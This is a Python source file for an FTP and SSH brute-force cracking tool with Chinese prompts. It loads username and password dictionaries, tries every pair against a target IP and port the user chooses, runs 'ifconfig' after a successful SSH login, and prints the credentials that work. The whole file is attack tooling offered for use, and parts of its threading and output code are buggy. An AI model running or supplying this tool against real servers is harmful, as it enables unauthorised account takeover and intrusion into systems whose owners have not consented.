import ftplib
ftp=ftplib.FTP()
import threading
import queue
q=queue.Queue()
import index
import paramiko
ssh=paramiko.SSHClient()
import re
import sys

#初始化
def start():
    print('''
        #------爆破------#
        \n1-ftp\n2-ssh
        ''')
    cs=input('[yzd@爆破]#:')
    if cs=='back':
        index.index_start()
    global qip
    qip=input('IP:')
    if qip=='back':
        start()
    while qip=='' or qip.count('.')!=3:
        qip = input('IP:')
    global qport
    qport=input('Port:')
    if qport=='back':
        start()
    while qport=='' or int(qport)>65535 or int(qport)<=0:
        qport = input('Port:')

    if cs=='1':
        global zt
        zt = 'ftp_'
        dic_load(cs)
        build(cs)
    if cs=='2':
        zt = 'ssh_'
        dic_load(cs)
        build(cs)

#加载字典
class default_dic():
    def __init__(self,cs):
        self.cs=cs
        self.zt=''
        if cs=='1':
            self.zt='ftp_'
        if cs=='2':
            self.zt='ssh_'
    def dic_u(self):
        file_u='dic/'+self.zt+'u.txt'
        return file_u
    def dic_p(self):
        file_p='dic/'+self.zt+'p.txt'
        return file_p


def dic_load(cs):
    list_up=[]
    global dic_cd
    s=input('1-默认字典\n2-导入字典\n#:')
    if s=='1':
        d=default_dic(cs)
        f_u=d.dic_u()
        f_p=d.dic_p()
        for username in open(f_u):
            username = username.replace('\n', '')
            for password in open(f_p):
                password = password.replace('\n', '')
                up = username + '|' + password
                list_up.append(up)
                dic_cd = len(list_up)
                q.put(list_up)
    if s=='2':
        file_u=input('用户名字典:')
        file_p=input('密码字典:')
        for username in open(file_u):
            username=username.replace('\n','')
            for password in open(file_p):
                if username=='' and password=='':
                    break
                password=password.replace('\n','')
                up=username+'|'+password
                list_up.append(up)
                dic_cd = len(list_up)
                q.put(list_up)
#ftp爆破
def fuzz_ftp(n,a):
    up=q.get()
    m=0
    if n==1:
        while m<=n*a-1:
            uap=str(up[m])
            uap=uap.split('|')
            username=uap[0]
            password=uap[1]
            try:
                ftp.connect(qip,int(qport))
                ftp.login(username,password)
                if ftp.getwelcome()!='':
                    print(ftp.getwelcome())
                    print('username=' +'['+ username +']'+ '\n' + 'password=' +'['+ password+']')
                    if ftp.getwelcome().find('Welcome',0,len(ftp.getwelcome()))!='':
                        break
            except ftplib.all_errors:
                pass
            m=m+1
    if n!=1:
        m=(n-1)*a
        while m<=n*a:
            if m>len(up):
                break
            uap = str(up[m])
            uap = uap.split('|')
            username = uap[0]
            password = uap[1]
            try:
                ftp.connect(qip, int(qport))
                ftp.login(username, password)
                if ftp.getwelcome() != '':
                    print(ftp.getwelcome())
                    print('username=' +'['+ username +']'+ '\n' + 'password=' +'['+ password+']')
                    if ftp.getwelcome().find('Welcome',0,len(ftp.getwelcome()))!='':
                        break
            except ftplib.all_errors:
                pass
            m=m+1
            if m==dic_cd:
                break


#SSH爆破-----------------------------------------SSH
def fuzz_ssh(n,a):
    up = q.get()
    m = 0
    if n == 1:
        while m <= n * a - 1:
            uap = str(up[m])
            uap = uap.split('|')
            username = uap[0]
            password = uap[1]
            try:
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
                ssh.connect(hostname=qip, port=int(qport), username=username, password=password,timeout=timeout)
                stdin, stdout, stderr = ssh.exec_command('ifconfig')
                result = str(stdout.read())
                ssh.close()
                if re.search(qip, result)!=None:
                    wz = str(re.search(qip, result).span())
                    wz = wz.replace(' ', '')
                    wz = wz.replace('(', '')
                    wz = wz.replace(')', '')
                    wz = wz.split(',')
                    s=int(wz[0])
                    e=int(wz[1])
                    sip=result[s:e]
                    print(sip)
                    if sip==qip:
                        print('[+]登陆成功\nusername=' + '[' + username + ']' + '\n' + 'password=' + '[' + password + ']'+'m='+m)
                        break
            except BaseException as error:
                pass
            m = m + 1
    if n != 1:
        m = (n - 1) * a
        while m <= n * a - 1:
            if m>len(up):
                break
            uap = str(up[m])
            uap = uap.split('|')
            username = uap[0]
            password = uap[1]
            try:
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=qip, port=int(qport), username=username, password=password,timeout=timeout)
                stdin, stdout, stderr = ssh.exec_command('ifconfig')
                result = str(stdout.read())
                ssh.close()
                if re.search(qip, result)!=None:
                    wz = str(re.search(qip, result).span())
                    wz = wz.replace(' ', '')
                    wz = wz.replace('(', '')
                    wz = wz.replace(')', '')
                    wz = wz.split(',')
                    s = int(wz[0])
                    e = int(wz[1])
                    sip = result[s:e]
                    print(sip)
                    if sip == qip:
                        print('[+]登陆成功\nusername=' + '[' + username + ']' + '\n' + 'password=' + '[' + password + ']'+'m='+m)
                        break
            except BaseException as error:
                pass
            m = m + 1
            if m == dic_cd:
                break






#创建线程
def build(cs):
    cs=cs
    global xcs
    global n
    xcs=int(input('线程数:'))
    if cs=='1':
        a = dic_cd // xcs
        while dic_cd%xcs!=0:
            xcs=xcs+1
        n=1
        while n<=xcs:
            t=threading.Thread(target=fuzz_ftp(n,a))
            t.start()
            n=n+1

    if cs=='2':
        global timeout
        timeout=int(input('超时时间:'))
        a = dic_cd // xcs
        while dic_cd % xcs != 0:
            xcs = xcs + 1
        n = 1
        while n <= xcs:
            t=threading.Thread(target=fuzz_ssh(n,a))
            t.start()
            n = n + 1



if __name__ == '__main__':
    start()